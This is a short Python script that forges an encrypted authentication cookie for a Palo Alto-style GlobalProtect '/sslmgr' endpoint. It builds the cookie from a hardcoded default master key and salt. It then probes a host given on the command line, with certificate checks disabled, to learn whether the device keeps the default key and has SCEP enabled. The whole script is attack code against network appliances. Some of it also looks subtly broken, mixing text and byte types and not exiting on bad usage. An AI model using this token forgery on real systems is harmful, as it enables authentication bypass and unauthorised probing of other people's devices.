from hashlib import md5, sha1
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from base64 import b64encode, b64decode
import sys, time
import requests

DEFAULT_MASTERKEY=b'p1a2l3o4a5l6t7o8'

class PanCrypt():
    def __init__(self, key=DEFAULT_MASTERKEY):
        backend=default_backend()
        key=self._derivekey(key)
        self.c=Cipher(algorithms.AES(key), modes.CBC(b'\0'*16), backend=backend)
    def _derivekey(self,key): 
        salt=b'\x75\xb8\x49\x83\x90\xbc\x2a\x65\x9c\x56\x93\xe7\xe5\xc5\xf0\x24' # md5("pannetwork")
        return md5(key+salt).digest()*2
    def _pad(self, d):
        plen=16-(len(d)%16)
        return d+(chr(plen)*plen).encode()
    def _encrypt(self,data): 
        e=self.c.encryptor()
        return e.update(self._pad(data)) + e.finalize()
    def encrypt(self, data):
        v=b'AQ==' # version 1
        hash=b64encode(sha1(data).digest())
        ct=b64encode(self._encrypt(data))
        return '-'+v+hash+ct

def getPayload(spn):
    email=b"test@test.test"
    user=b"test"
    hostid=b"test"
    expiry=bytes(int(time.time())+1000000)
    token_pt=b":".join((expiry, user, hostid))
    token=PanCrypt().encrypt(token_pt)
    return "scep-profile-name={}&user-email={}&user={}&host-id={}&appauthcookie={}".format(spn, email, user, hostid, token)

 
resp_default="<msg>Unable to find the configuration</msg>"
resp_params="<msg>Invalid parameters</msg>"
resp_invalid="<msg>Invalid Cookie</msg>"
resp_good="<msg>Unable to generate client certificate</msg>"

resps={
    resp_default:"Default MK",
    resp_params: "Invalid parameters, bug?",
    resp_invalid: "MK is not default",
    resp_good: "Default MK, SCEP enabled and correct scep-profile-name",
}
   
def classify(resp):
    for i in resps:
        if i in resp: return resps[i]
    return "unknown"

if __name__=="__main__":
    if len(sys.argv)<2:
        print("usage: checkmk.py <host>")
    host=sys.argv[1]+"/sslmgr"
    spn=b"test"
    if len(sys.argv)>2:
        spn=sys.argv[2]
    data=getPayload(spn)
    
    if "http" not in host: host="https://"+host
    #print("curl -k -d '{}' '{}'".format(data, host))
    r=requests.get(host, data=data, headers={"content-type":"application/x-www-form-urlencoded"},verify=False)
    print(r.text)
    print(classify(r.text))

